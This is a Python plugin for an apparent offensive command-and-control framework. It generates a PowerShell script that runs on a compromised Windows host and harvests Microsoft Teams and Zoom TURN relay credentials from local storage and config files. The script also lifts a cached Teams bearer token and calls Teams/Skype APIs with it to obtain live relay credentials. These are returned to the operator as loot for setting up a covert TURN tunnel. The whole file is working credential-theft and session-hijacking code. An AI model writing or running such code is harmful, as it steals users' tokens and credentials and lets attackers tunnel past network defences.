"""
recon/turnt_credentials — Extract TURN server credentials from Teams/Zoom on the agent.
MITRE T1539 (Steal Web Session Cookie) / T1552.001 (Credentials In Files).

Microsoft Teams stores short-lived TURN relay tokens in its local storage DB and
can be refreshed on demand via the Teams Graph API. Zoom stores encrypted relay
credentials in its config files. This plugin harvests them so the operator can
feed them into turnt-controller to establish a TURN tunnel.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class TurntCredentials(BasePlugin):
    NAME        = "turnt_credentials"
    DESCRIPTION = "Harvest Teams/Zoom TURN relay credentials for turnt-controller tunnel setup (T1539)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1539"
    CATEGORY    = "recon"
    VERSION     = "1.0.0"

    schema = ParamSchema().add(
        Param("platform", str, required=False, default="auto",
              help="auto | msteams | zoom  — which platform to extract from"),
        Param("refresh", str, required=False, default="true",
              help="true = request a fresh relay token from Teams API"),
        Param("timeout", int, required=False, default=45),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        platform = params.get("platform", "auto").lower()
        refresh  = params.get("refresh", "true").lower() == "true"
        timeout  = int(params.get("timeout", 45))

        ps = self._build_ps(platform, refresh)
        r  = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"turnt_credentials failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="turnt_credentials",
                               label="TURN relay credentials")

    @staticmethod
    def _build_ps(platform: str, refresh: bool) -> str:
        refresh_flag = "true" if refresh else "false"
        return rf"""
$results  = @("[*] turnt_credentials — TURN server credential harvester")
$platform = '{platform}'
$doRefresh = [bool]::Parse('{refresh_flag}'.Substring(0,1).ToUpper() + '{refresh_flag}'.Substring(1))

# ── Helper: pretty-print YAML-like output ──────────────────────────────────
function Out-TurntYaml($label, $data) {{
    $results += ""
    $results += "# === $label ==="
    foreach ($k in $data.Keys) {{
        $results += "$($k): $($data[$k])"
    }}
}}

# ══════════════════════════════════════════════════════════════════════════════
# Microsoft Teams
# ══════════════════════════════════════════════════════════════════════════════
function Get-TeamsCreds {{
    $teamsBase = "$env:APPDATA\Microsoft\Teams"
    if (-not (Test-Path $teamsBase)) {{
        return "[!] Teams not installed (no AppData\Microsoft\Teams)"
    }}

    $out = @()
    $out += "[+] Teams directory: $teamsBase"

    # ── 1. LevelDB storage (Teams Classic) ──────────────────────────────────
    $ldbPath = "$teamsBase\Local Storage\leveldb"
    if (Test-Path $ldbPath) {{
        $out += "[*] Scanning LevelDB for relay tokens..."
        Get-ChildItem $ldbPath -Filter "*.log" -ErrorAction SilentlyContinue |
        ForEach-Object {{
            $content = [System.IO.File]::ReadAllText($_.FullName, [System.Text.Encoding]::Latin1)
            # TURN relay token pattern: "password":"<base64>"  near "relay.teams.microsoft.com"
            $m = [regex]::Matches($content,
                '"username"\s*:\s*"([^"]+relay[^"]*)".*?"password"\s*:\s*"([^"]{20,})"')
            foreach ($match in $m) {{
                $out += "  [relay token found]"
                $out += "  username : $($match.Groups[1].Value)"
                $out += "  password : $($match.Groups[2].Value.Substring(0, [Math]::Min(40,$match.Groups[2].Value.Length)))..."
            }}
        }}
    }}

    # ── 2. Teams v2 (work account .ldb files) ───────────────────────────────
    $v2Paths = @(
        "$env:LOCALAPPDATA\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams",
        "$env:APPDATA\Microsoft\Teams\EBWebView\Default\Local Storage\leveldb"
    )
    foreach ($p in $v2Paths) {{
        if (Test-Path $p) {{
            $out += "[*] Teams v2 path found: $p"
            Get-ChildItem $p -Filter "*.ldb" -ErrorAction SilentlyContinue |
            Select-Object -First 5 |
            ForEach-Object {{
                $bytes = [System.IO.File]::ReadAllText($_.FullName, [System.Text.Encoding]::Latin1)
                if ($bytes -match 'relay\.teams\.microsoft\.com') {{
                    $out += "  [*] Relay endpoint reference in $($_.Name)"
                    $m2 = [regex]::Matches($bytes, '"password"\s*:\s*"([A-Za-z0-9+/]{{40,}}={0,2})"')
                    foreach ($mm in $m2) {{
                        $out += "  password_candidate: $($mm.Groups[1].Value.Substring(0,[Math]::Min(60,$mm.Groups[1].Value.Length)))..."
                    }}
                }}
            }}
        }}
    }}

    # ── 3. Live API refresh via stored access token ──────────────────────────
    if ($doRefresh) {{
        $out += "[*] Attempting live TURN token refresh via Teams Graph API..."
        $tokenPath = "$teamsBase\Cookies"

        # Find a cached bearer token (stored as JSON in localStorage or Cookies DB)
        $bearerToken = $null
        $loginCachePaths = @(
            "$teamsBase\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams"
        )
        foreach ($lp in $loginCachePaths) {{
            if (-not (Test-Path $lp)) {{ continue }}
            Get-ChildItem $lp -Filter "*.log" -ErrorAction SilentlyContinue |
            Select-Object -First 10 |
            ForEach-Object {{
                if ($bearerToken) {{ return }}
                $c = [System.IO.File]::ReadAllText($_.FullName, [System.Text.Encoding]::Latin1)
                $tm = [regex]::Match($c, '"accessToken"\s*:\s*"(eyJ[A-Za-z0-9_-]{{100,}})"')
                if ($tm.Success) {{
                    $bearerToken = $tm.Groups[1].Value
                }}
            }}
        }}

        if ($bearerToken) {{
            $out += "[+] Found Teams access token (first 40 chars): $($bearerToken.Substring(0,40))..."
            try {{
                # Request TURN credentials from Teams API
                $apiUrl = "https://api.spaces.skype.com/v1/me/skypetokenV2"
                $headers = @{{
                    "Authorization" = "Bearer $bearerToken"
                    "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                    "Accept"        = "application/json"
                }}
                $resp = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method GET -TimeoutSec 10 -ErrorAction Stop
                if ($resp.token) {{
                    $out += "[+] Skype token retrieved — using for TURN credential request"
                    $turnUrl = "https://api.spaces.skype.com/v1/me/turnserver/credentialsv2"
                    $turnHeaders = $headers.Clone()
                    $turnHeaders["X-Skypetoken"] = $resp.token
                    $turnResp = Invoke-RestMethod -Uri $turnUrl -Headers $turnHeaders -Method GET -TimeoutSec 10
                    if ($turnResp.iceServers) {{
                        $out += ""
                        $out += "# LIVE TURN CREDENTIALS (ready for turnt-controller):"
                        $out += "type: msteams"
                        foreach ($srv in $turnResp.iceServers) {{
                            if ($srv.urls -match "turn:") {{
                                $out += "turn_server: $($srv.urls | Where-Object {{ $_ -match 'turn:' }} | Select-Object -First 1)"
                                $out += "username: $($srv.username)"
                                $out += "password: $($srv.credential)"
                            }}
                        }}
                    }}
                }}
            }} catch {{
                $out += "[-] API call failed: $($_.Exception.Message)"
                $out += "[*] Use turnt-credentials.exe msteams on agent for full extraction"
            }}
        }} else {{
            $out += "[-] No cached access token found — Teams may not be logged in"
        }}
    }}

    return $out -join "`n"
}}

# ══════════════════════════════════════════════════════════════════════════════
# Zoom
# ══════════════════════════════════════════════════════════════════════════════
function Get-ZoomCreds {{
    $out = @()
    $zoomPaths = @(
        "$env:APPDATA\Zoom\data",
        "$env:LOCALAPPDATA\Zoom\data"
    )
    $found = $false
    foreach ($zp in $zoomPaths) {{
        if (-not (Test-Path $zp)) {{ continue }}
        $found = $true
        $out += "[+] Zoom data path: $zp"
        # Zoom stores STUN/TURN config in zoommeeting.enc or zoomus.conf
        Get-ChildItem $zp -File -ErrorAction SilentlyContinue |
        Where-Object {{ $_.Name -match 'zoom|stun|turn|conf|enc' }} |
        ForEach-Object {{
            $bytes = try {{ [System.IO.File]::ReadAllText($_.FullName, [System.Text.Encoding]::Latin1) }} catch {{ "" }}
            if ($bytes -match 'turn|stun|relay') {{
                $out += "  [*] Potential relay config: $($_.Name)"
                $m = [regex]::Matches($bytes, '(?:turn|stun|relay)[^\n]{{0,120}}')
                foreach ($mm in $m) {{
                    $out += "    $($mm.Value.Substring(0, [Math]::Min(100,$mm.Value.Length)))"
                }}
            }}
        }}
    }}
    if (-not $found) {{ $out += "[!] Zoom data directory not found" }}
    $out += "[*] Full Zoom TURN extraction requires turnt-credentials.exe zoom (manual credential copy)"
    return $out -join "`n"
}}

# ══════════════════════════════════════════════════════════════════════════════
# Dispatch
# ══════════════════════════════════════════════════════════════════════════════
if ($platform -eq 'auto' -or $platform -eq 'msteams') {{
    $results += Get-TeamsCreds
}}
if ($platform -eq 'auto' -or $platform -eq 'zoom') {{
    $results += ""
    $results += Get-ZoomCreds
}}

$results += ""
$results += "# Next step:"
$results += "#   operator$ turnt-controller -config <(echo 'type: msteams')"
$results += "#   then: use turnt_relay plugin with the SDP offer"
$results -join "`n"
""".strip()
